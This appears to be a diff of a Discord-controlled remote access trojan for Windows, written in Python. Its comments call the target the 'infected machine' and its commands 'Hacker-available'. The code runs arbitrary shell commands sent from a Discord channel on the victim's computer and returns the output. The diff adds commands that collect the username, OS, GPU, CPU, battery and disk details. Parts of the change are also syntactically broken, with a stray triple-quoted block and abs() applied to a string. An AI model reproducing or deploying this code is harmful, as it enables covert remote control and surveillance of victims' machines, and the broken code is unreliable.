@@ -20,6 +20,7 @@ import platform
 import win32api
 import shutil
 import ctypes
+import statux
 def Mbox(title, text, style):
     return ctypes.windll.user32.MessageBoxW(0, text, title, style)
 
@@ -40,7 +41,10 @@ except:
 
 # Declaring some functions to simplify the code
 #          <[Declaring Functions]>
-
+def convertTime(seconds): 
+    minutes, seconds = divmod(seconds, 60) 
+    hours, minutes = divmod(minutes, 60) 
+    return "%d:%02d:%02d" % (hours, minutes, seconds) 
 
 def available_disks():
     drives = win32api.GetLogicalDriveStrings()
@@ -189,14 +193,14 @@ async def on_message(message):
                   try: #Default - return an Embed with the command return and info
                         answerprev = subprocess.Popen(message.content[5:], shell=True, stdout=subprocess.PIPE)
                         answer = str(answerprev.stdout.read())
-                        embed = discord.Embed(title="Executing command", description=f"Commmand executed on machine with ID {cid}", color=discord.Color.blue())
+                        embed = discord.Embed(title="Executing command", description=f"Commmand executed on machine with ID {cid}", color=discord.Color.green())
                         embed.add_field(name="Command", value=f"{message.content[5:]}", inline=False)
                         embed.add_field(name="Return", value=f"{answer}", inline=False)
                         await sch.send(embed=embed)
                   except:
 
                         try: #Option B - If the default option fails (Probably due to send in one message the command being too long, like "ipconfig" or "tasklist") it sends a .txt file with the command return.
-                              embed = discord.Embed(title="Executing command", description=f"Commmand executed on machine with ID {cid}", color=discord.Color.blue())
+                              embed = discord.Embed(title="Executing command", description=f"Commmand executed on machine with ID {cid}", color=discord.Color.green())
                               embed.add_field(name="Command", value=f"{message.content[5:]}", inline=False)
                               await sch.send(embed=embed)
                               with open("C:\\Users\\Public\\temps.txt", "w") as file:
@@ -226,16 +230,51 @@ async def on_message(message):
 
             #This command sends advanced informations of the infected machine. The given informations contain the Battery Level of the machine, the infection ID, the CPU Model, the GPU Chipset, the used, free and total space on each connected drive and so on.
             #                                                                                    <[Adding Hacker-available command - Feature currently in focused development]>
-
-            if f"/info" in message.content[0:5]:
+            if f"/info windows" in message.content[0:13]:
+                  embed = None
+                  embed = discord.Embed(title=f"Machine info", description=f"Requested Windows info of machine with ID {cid}\n ⠀", color=discord.Color.blue())
+                  embed.add_field(name="Windows Version", value=platform.platform(), inline=True)
+                  embed.add_field(name="Architecture", value=platform.machine(), inline=True)
+                  embed.add_field(name="Username", value=f"{getpass.getuser()}", inline=True)
+                  await sch.send(embed=embed)
+            elif f"/info gpu" in message.content[0:9]:
+                  for index in range(0, len(GPUtil.getGPUs())):
+                        embed = None
+                        embed = discord.Embed(title=f"Machine info", description=f"Requested Windows info of machine with ID {cid}\n ⠀", color=discord.Color.blue())
+                        embed.add_field(name=f"GPU {index+1} Chipset", value=GPUtil.getGPUs()[index].name, inline=True)
+                        embed.add_field(name=f"GPU {index+1} Driver Version", value=GPUtil.getGPUs()[index].driver, inline=True)
+                        embed.add_field(name=f"GPU {index+1} Memory Size", value=str(GPUtil.getGPUs()[index].memoryTotal) + "MB", inline=True)
+                  await sch.send(embed=embed)
+            elif f"/info cpu" in message.content[0:9]:
+                  embed = None
+                  embed = discord.Embed(title=f"Machine info", description=f"Requested Windows info of machine with ID {cid}\n ⠀", color=discord.Color.blue())
+                  embed.add_field(name="CPU Model", value=cpuinfo.get_cpu_info()['brand_raw'], inline=True)
+                  embed.add_field(name="Architecture", value=platform.machine(), inline=True)
+                  await sch.send(embed=embed)
+            elif f"/info battery" in message.content[0:13]:
+                  embed = None
                   battery = psutil.sensors_battery()
                   try:
-                        bp = f"{str(battery.percent)}%"
+                        embed = discord.Embed(title=f"Machine info", description=f"Requested Windows info of machine with ID {cid}\n ⠀", color=discord.Color.blue())
+                        embed.add_field(name="Battery Level", value=battery.percent, inline=True)
+                        embed.add_field(name="Time Left", value=abs(convertTime(battery.secsleft)), inline=True)
+                        if battery.power_plugged:
+                              embed.add_field(name="Battery Status", value="Charging", inline=True)
+                        else:
+                              embed.add_field(name="Battery Status", value="Discharging", inline=True)
                   except:
-                        bp = "Not available"
-
-                  
-                  embed = discord.Embed(title=f"Machine info", description=f"Requested system info of machine with ID {cid}\n ⠀", color=discord.Color.blue())
+                        embed = discord.Embed(title=f"Error", description=f"Battery not available on machine with ID {cid}", color=discord.Color.red())
+                  await sch.send(embed=embed)
+            elif f"/info disk" in message.content[0:10]:
+                  adisks = available_disks()
+                  embed = None
+                  embed = discord.Embed(title=f"Disk Info", description=f"Requested disk info of machine with ID {cid}\n ⠀", color=discord.Color.blue())
+                  for disk in adisks:
+                        embed.add_field(name=f"Total Space on {disk[:-1]}", value=str(disk_space(disk)[0]) + "GB", inline=True)
+                        embed.add_field(name=f"Free Space on {disk[:-1]}", value=str(disk_space(disk)[2]) + "GB", inline=True)
+                        embed.add_field(name=f"Used Space on {disk[:-1]}", value=str(disk_space(disk)[1]) + "GB", inline=True)
+                  await sch.send(embed=embed)
+"""                  embed = discord.Embed(title=f"Machine info", description=f"Requested system info of machine with ID {cid}\n ⠀", color=discord.Color.blue())
                   embed.add_field(name="IP Adress", value=requests.get('https://api.ipify.org').text, inline=True)
                   embed.add_field(name="Username", value=f"{getpass.getuser()}", inline=True)
                   embed.add_field(name="Infection ID", value=cid, inline=True)
@@ -245,16 +284,7 @@ async def on_message(message):
                         embed.add_field(name=f"GPU {index+1} Chipset", value=GPUtil.getGPUs()[index].name, inline=True)
                         embed.add_field(name=f"GPU {index+1} Driver Version", value=GPUtil.getGPUs()[index].driver, inline=True)
                         embed.add_field(name=f"GPU {index+1} Memory Size", value=str(GPUtil.getGPUs()[index].memoryTotal) + "MB", inline=True)
-                  embed.add_field(name="Machine Time", value=str(datetime.now().strftime("%H:%M:%S")), inline=True)
-                  embed.add_field(name="Machine Date", value=str(date.today().strftime("%d/%m/%Y")))
                   embed.add_field(name="Bit Number", value=platform.machine(), inline=True)
-                  embed.add_field(name="Operating System", value=platform.platform(), inline=True)
-                  adisks = available_disks()
-                  for disk in adisks:
-                        embed.add_field(name=f"Total Space on {disk[:-1]}", value=str(disk_space(disk)[0]) + "GB", inline=True)
-                        embed.add_field(name=f"Free Space on {disk[:-1]}", value=str(disk_space(disk)[2]) + "GB", inline=True)
-                        embed.add_field(name=f"Used Space on {disk[:-1]}", value=str(disk_space(disk)[1]) + "GB", inline=True)
-                  await sch.send(embed=embed)
-
+                  embed.add_field(name="Operating System", value=platform.platform(), inline=True)"""
 
 client.run(token)
